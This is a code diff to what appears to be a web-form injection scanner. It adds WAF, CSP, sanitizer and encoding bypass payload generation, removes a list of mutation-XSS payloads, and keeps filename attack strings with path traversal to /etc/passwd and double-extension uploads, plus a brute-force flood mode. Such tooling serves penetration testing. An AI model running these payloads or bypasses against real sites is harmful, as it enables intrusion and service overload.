@@ -24,6 +24,11 @@ import os
 import tempfile
 from pathlib import Path
 import html
+from waf_bypass import waf_bypass
+from csp_bypass import csp_bypass
+from sanitizer_bypass import sanitizer_bypass
+from encoder_bypass import encoder_bypass
+from size_overflow import size_overflow
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -918,10 +923,51 @@ def parse_proxy(proxy_url):
 
     return proxies
 
-def load_payloads(file_path):
+def load_payloads(file_path, bypass_flags=None):
     try:
         with open(file_path, 'r') as f:
-            return json.load(f)
+            payloads = json.load(f)
+        
+        if bypass_flags:
+            enhanced_payloads = []
+            for payload in payloads:
+                enhanced_payloads.append(payload)
+                
+                if bypass_flags.get('waf_bypass'):
+                    bypassed = waf_bypass.generate_bypassed_payloads(payload['inputField'], 3)
+                    for bp in bypassed:
+                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_WAF_BYPASS'})
+                
+                if bypass_flags.get('csp_bypass') and payload['category'] in ['HTML', 'XSS']:
+                    bypassed = csp_bypass.generate_csp_bypass_payloads(payload['inputField'], 2)
+                    for bp in bypassed:
+                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_CSP_BYPASS'})
+                
+                if bypass_flags.get('sanitizer_bypass'):
+                    bypassed = sanitizer_bypass.generate_sanitizer_bypass_payloads(payload['inputField'], 3)
+                    for bp in bypassed:
+                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_SANITIZER_BYPASS'})
+                
+                if bypass_flags.get('encoder_bypass'):
+                    bypassed = encoder_bypass.generate_encoding_confusion(payload['inputField'], 2)
+                    for bp in bypassed:
+                        enhanced_payloads.append({'inputField': bp, 'category': payload['category'] + '_ENCODER_BYPASS'})
+                
+                if bypass_flags.get('encoding_confusion'):
+                    # Special encoding confusion combinations
+                    confused = encoder_bypass.generate_encoding_confusion(payload['inputField'], 3)
+                    for cf in confused:
+                        enhanced_payloads.append({'inputField': cf, 'category': payload['category'] + '_ENCODING_CONFUSION'})
+                
+                if bypass_flags.get('size_overflow'):
+                    overflowed = size_overflow.generate_overflow_payloads(payload['inputField'], 2)
+                    for of in overflowed:
+                        enhanced_payloads.append({'inputField': of, 'category': payload['category'] + '_SIZE_OVERFLOW'})
+            
+            return enhanced_payloads
+        
+        return payloads
+        
     except FileNotFoundError:
         console.print(f"[bold red]Error: Payload file '{file_path}' not found.[/bold red]")
         sys.exit(1)
@@ -1443,7 +1489,7 @@ async def test_login_input_fields(url, payloads, cookies, user_agents, input_fie
     table.add_column("Vulnerability Detected", style="bold green")
 
     if brute_mode:
-        console.print(f"[bold red]🚀 BRUTE FORCE MODE ACTIVATED[/bold red]")
+        console.print(f"[bold red]BRUTE FORCE MODE PARAMETERS:[/bold red]")
         console.print(f"[yellow]Concurrent: {max_concurrent} | Timeout: {timeout}s | Batch size: {batch_size}[/yellow]")
         
         connector = aiohttp.TCPConnector(
@@ -1799,7 +1845,7 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
                     field_name = field.get('name', 'input_field')
                     field_type = field.get('type', 'text').lower()
                     
-                    # Inject payload into all text fields
+                    # Inject payload into all text fields (if not in login mode bruh) 
                     if field_type in ['text', 'email', 'search', 'url', 'tel'] or field.name in ['textarea', 'select']:
                         data[field_name] = payload['inputField']
                     elif field_type == 'password':
@@ -1864,7 +1910,7 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
                     "vulnerabilities": [f"Request Failed: {str(e)}"]
                 }
 
-    # Prepare all test combinations
+    # prepare all test combinations
     test_combinations = []
     for form in forms:
         for payload in payloads:
@@ -1988,108 +2034,7 @@ async def test_all_forms(url, payloads, threat_type, cookies, user_agents, metho
     console.print(f"[bold green]Test results saved to 'all_forms_test_results.json'[/bold green]")
     
     return results
-async def test_mutation_xss(url, input_fields, cookies, user_agents, method="POST", proxies=None, 
-                           ssl_cert=None, ssl_key=None, ssl_verify=False, verbose=False, 
-                           verbose_all=False, secs=0, payload_filters=None):
-    """
-    Test Mutation XSS vulnerabilities
-    """
-    console.print("[bold blue]🧬 Testing Mutation XSS vulnerabilities...[/bold blue]")
-    
-    # Mutation XSS specific payloads
-    mutation_xss_payloads = [
-        # Classic mutation vectors
-        {"inputField": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "category": "mXSS"},
-        {"inputField": "<textarea><script>alert(1)</script></textarea>", "category": "mXSS"},
-        {"inputField": "<select><style></select><img src=x onerror=alert(1)>", "category": "mXSS"},
-        {"inputField": "<svg><style></svg><img src=x onerror=alert(1)>", "category": "mXSS"},
-        
-        # HTML5 mutation vectors
-        {"inputField": "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>", "category": "mXSS"},
-        {"inputField": "<table><td><script>alert(1)</script></td></table>", "category": "mXSS"},
-        {"inputField": "<div><style></div><img src=x onerror=alert(1)>", "category": "mXSS"},
-        
-        # Template injection mutations
-        {"inputField": "<template><script>alert(1)</script></template>", "category": "mXSS"},
-        {"inputField": "<div><template><img src=x onerror=alert(1)></template></div>", "category": "mXSS"},
-        
-        # Shadow DOM related
-        {"inputField": "<div><shadow></shadow><script>alert(1)</script></div>", "category": "mXSS"},
-        
-        # Comment mutation vectors
-        {"inputField": "<!--<script>-->alert(1)<!--</script>-->", "category": "mXSS"},
-        {"inputField": "<div><!--</div><img src=x onerror=alert(1)>-->", "category": "mXSS"},
-        
-        # CDATA mutation vectors
-        {"inputField": "<![CDATA[<script>alert(1)</script>]]>", "category": "mXSS"},
-        {"inputField": "<svg><![CDATA[</svg><img src=x onerror=alert(1)>]]>", "category": "mXSS"},
-        
-        # Entity encoding mutations
-        {"inputField": "&lt;script&gt;alert(1)&lt;/script&gt;", "category": "mXSS"},
-        {"inputField": "&#60;script&#62;alert(1)&#60;/script&#62;", "category": "mXSS"},
-        
-        # Mixed context mutations
-        {"inputField": "<div style=\"background:url('javascript:alert(1)')\">test</div>", "category": "mXSS"},
-        {"inputField": "<a href=\"javascript:alert(1)\">click</a>", "category": "mXSS"},
-        
-        # DOM clobbering mutations
-        {"inputField": "<form name=\"alert\"><input name=\"1\"></form>", "category": "mXSS"},
-        {"inputField": "<img name=\"outerHTML\"><div>test</div>", "category": "mXSS"},
-        
-        # Mutation-specific payloads
-        {"inputField": "<xss id=\"</xss><img src=x onerror=alert(1)>\">", "category": "mXSS"},
-        {"inputField": "<div data-xss=\"</div><script>alert(1)</script>\">content</div>", "category": "mXSS"},
-        
-        # SVG mutations
-        {"inputField": "<svg><animate onbegin=\"alert(1)\" attributeName=\"x\" dur=\"1s\"></svg>", "category": "mXSS"},
-        {"inputField": "<svg><set onbegin=\"alert(1)\" attributeName=\"x\" to=\"1\"></svg>", "category": "mXSS"},
-        
-        # MathML mutations
-        {"inputField": "<math><mi xlink:href=\"javascript:alert(1)\">test</mi></math>", "category": "mXSS"},
-        
-        # Namespace mutations
-        {"inputField": "<div xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></div>", "category": "mXSS"}
-    ]
-    
-    if payload_filters:
-        filter_patterns = [pattern.strip() for pattern in payload_filters.split(",")]
-        mutation_xss_payloads = filter_payloads(mutation_xss_payloads, filter_patterns)
-        console.print(f"[yellow]Filtered mXSS payloads: {len(mutation_xss_payloads)}[/yellow]")
-    
-    results = []
-    
-    for field in input_fields:
-        console.print(f"[cyan]Testing field: {field.get('name', 'unnamed')}[/cyan]")
-        
-        field_results = await test_input_field(
-            url, mutation_xss_payloads, "mXSS", cookies, user_agents, field,
-            method, proxies, ssl_cert, ssl_key, ssl_verify,
-            verbose, verbose_all, payload_filters, secs,
-            brute_mode=False  # brute
-        )
-        
-        if field_results:  # Check if results is not None
-            results.extend(field_results)
-        else:
-            console.print(f"[yellow]No results returned for field: {field.get('name', 'unnamed')}[/yellow]")
-    
-    # Analyze mutation-specific patterns
-    mutation_results = []
-    for result in results:
-        if "mXSS" in str(result.get('vulnerabilities', [])):
-            mutation_results.append(result)
-    
-    if mutation_results:
-        console.print("[bold red]🚨 MUTATION XSS VULNERABILITIES DETECTED![/bold red]")
-        for result in mutation_results:
-            console.print(f"[red]Field: {result.get('field', 'unknown')}[/red]")
-            console.print(f"[red]Payload: {result.get('payload', 'unknown')}[/red]")
-            console.print(f"[red]Vulnerabilities: {result.get('vulnerabilities', [])}[/red]")
-            console.print("[red]" + "="*50 + "[/red]")
-    else:
-        console.print("[green]✅ No mutation XSS vulnerabilities detected[/green]")
-    
-    return results
+
 def analyze_mutation_xss_response(content, payload):
     vulnerabilities = []
     
@@ -2116,12 +2061,12 @@ def analyze_mutation_xss_response(content, payload):
 async def test_filename_xss(url, input_fields, cookies, user_agents, proxies=None, ssl_verify=False):
     
     filename_payloads = [
-        # Basic filename XSS
+        # filename XSS
         'test<img src=x onerror=alert(1)>.txt',
         'file<script>alert(1)</script>.jpg',
         'photo" onerror="alert(1).png',
         
-        # Double extension attacks
+        # multi-extension confusion
         'test.jpg.php',
         'file.png.html',
         'document.pdf.exe',
@@ -2130,16 +2075,16 @@ async def test_filename_xss(url, input_fields, cookies, user_agents, proxies=Non
         '../../../etc/passwd<img src=x onerror=alert(1)>',
         '..\\..\\windows\\system32<img src=x>',
         
-        # Special characters
+        # special chars
         'file%00.jpg',
         'test%0a%0d.txt',
         'photo\0.png',
         
-        # Long filename attacks
+        # too long filename
         'A' * 255 + '.jpg',
         'test' + '../' * 50 + 'exploit.jpg',
         
-        # Unicode and encoding
+        # unicode and encoding
         'file%C0%AE%C0%AE.jpg',  # UTF-8 
         'photo%2e%2e%2f.jpg',    # URL enc
         'test\u202eexe.jpg',     # right-to-left override
@@ -2266,7 +2211,7 @@ async def main():
     parser.add_argument("--ssl-key", help="Path to SSL private key file (e.g., key.pem)")
     parser.add_argument("--ssl-verify", action="store_true", help="Verify SSL certificate (default: False)")
     parser.add_argument("--mXSS", action="store_true", help="Test Mutation XSS vulnerabilities")
-    parser.add_argument('--brute', action='store_true', help='Brute force mode - maximum speed (Warning: Might Kill The Target!)')
+    parser.add_argument('--brute', action='store_true', help='Brute force mode - maximum speed (UWAŻAJ: może przeciążyć cel!)')
     parser.add_argument('--concurrent', type=int, default=50, help='Max concurrent requests (brute: 10-500, default: 50)')
     parser.add_argument('--timeout', type=float, default=15.0, help='Request timeout in seconds (brute: 3-60, default: 15)')
     parser.add_argument('--batch-size', type=int, default=100, help='Requests per batch (brute: 10-1000, default: 100)')
@@ -2280,6 +2225,12 @@ async def main():
     parser.add_argument("--fieldname", help="Specific input field name to test (e.g., 'username')")
     parser.add_argument("--filemode", action="store_true", help="Test filename XSS in file upload forms")
     parser.add_argument("-s", "--seconds", type=float, default=0, help="Delay between requests in seconds")
+    parser.add_argument("--waf-bypass", action="store_true", help="Generate WAF bypass payloads")
+    parser.add_argument("--csp-bypass", action="store_true", help="Generate CSP bypass payloads") 
+    parser.add_argument("--sanitizer-bypass", action="store_true", help="Generate HTML sanitizer bypass payloads")
+    parser.add_argument("--encoder-bypass", action="store_true", help="Generate encoder bypass payloads")
+    parser.add_argument("--encoding-confusion", action="store_true", help="Generate encoding confusion payloads")
+    parser.add_argument("--size-overflow", action="store_true", help="Generate size overflow payloads")
 
 
     if len(sys.argv) == 1:
@@ -2331,9 +2282,18 @@ async def main():
     else:
         console.print(f"[bold green]URL starts with HTTP: {args.url}[/bold green]")
 
+    bypass_flags = {
+    'waf_bypass': args.waf_bypass,
+    'csp_bypass': args.csp_bypass, 
+    'sanitizer_bypass': args.sanitizer_bypass,
+    'encoder_bypass': args.encoder_bypass,
+    'encoding_confusion': args.encoding_confusion,
+    'size_overflow': args.size_overflow
+}
+
     # load only if not scanning
     if not args.scan:
-        payloads = load_payloads(args.payloads)
+        payloads = load_payloads(args.payloads, bypass_flags)
 
         if args.filter:
             filter_patterns = [pattern.strip() for pattern in args.filter.split(",")]
